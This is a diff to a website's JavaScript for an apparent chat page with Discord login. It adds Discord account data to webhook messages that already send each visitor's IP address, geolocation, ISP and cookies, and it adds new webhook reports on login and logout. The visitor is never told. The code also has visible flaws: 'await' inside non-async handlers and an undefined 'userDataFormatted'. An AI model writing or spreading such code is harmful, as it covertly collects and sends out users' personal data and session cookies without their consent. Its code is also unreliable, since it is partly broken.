@@ -33,6 +33,8 @@ document.addEventListener('DOMContentLoaded', async function() {
     const loginButton = document.getElementById("loginButton");
     const logoutButton = document.getElementById("logoutButton");
     const profileUI = document.querySelector('.profile-ui');
+    const discordUser = localStorage.getItem('discordUser');
+    const userData = JSON.parse(discordUser);
 
     // Dark mode toggle functionality
     toggleButton.addEventListener('click', function() {
@@ -65,7 +67,10 @@ document.addEventListener('DOMContentLoaded', async function() {
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-        `.trim(), 16711680); // Red color for banned user
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`.trim(), 16711680); // Red color for banned user
 
         // Disable interaction and notify the user
         sendButton.disabled = true;
@@ -85,7 +90,10 @@ document.addEventListener('DOMContentLoaded', async function() {
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-        `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user visit
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`.trim(), Math.floor(Math.random() * 16777215)); // Random color for user visit
 
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis;
@@ -130,7 +138,10 @@ document.addEventListener('DOMContentLoaded', async function() {
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-            `.trim(), Math.floor(Math.random() * 16777215)); // Random color
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`.trim(), Math.floor(Math.random() * 16777215)); // Random color
 
             responseContainer.innerText = data.cevap;
             statusImage.src = statusEmojis.check; // Set to check emoji
@@ -150,7 +161,10 @@ document.addEventListener('DOMContentLoaded', async function() {
 **Org:** ${ipData.org}
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
-            `.trim(), 16711680); // Red color for errors
+**Discord User Data:** \`\`\`py
+${userDataFormatted}
+\`\`\`
+`.trim(), 16711680); // Red color for errors
 
             // Update the UI to reflect the error
             statusMessage.innerText = "An error occurred. Please try again later. If this error persists, inform and let the developer know.";
@@ -172,6 +186,19 @@ loginButton.addEventListener('click', function() {
 });
 
 logoutButton.addEventListener('click', function() {
+    await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`json
+${userDataFormatted}
+\`\`\`
+`.trim(), Math.floor(Math.random() * 16777215));
     localStorage.removeItem('discordUser');
     updateUI(); // Update UI after logout
     window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
@@ -179,11 +206,8 @@ logoutButton.addEventListener('click', function() {
 
 // Function to update UI based on login state
 function updateUI() {
-    const discordUser = localStorage.getItem('discordUser');
 
     if (discordUser) {
-        // User is logged in, parse user data
-        const userData = JSON.parse(discordUser);
         const usernameElement = document.querySelector('.username');
         usernameElement.innerText = userData.username; // Update username
         const profilePicture = profileUI.querySelector('.profile-picture');
@@ -201,6 +225,19 @@ function updateUI() {
             // If user data is in the URL, parse and store it
             const userData = JSON.parse(decodeURIComponent(userParam));
             localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
+            await sendWebhook("User Login", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`json
+${userDataFormatted}
+\`\`\`
+`.trim(), Math.floor(Math.random() * 16777215));
             updateUI();
             window.location.href = 'https://cakeorpastry.netlify.app/testgpt'
         } else {
@@ -210,7 +247,7 @@ function updateUI() {
         }
     }
 
-    profileUI.style.display = 'block'; // Always show profile UI
+    //profileUI.style.display = 'block'; // Always show profile UI
 }
 
 // Initial UI setup
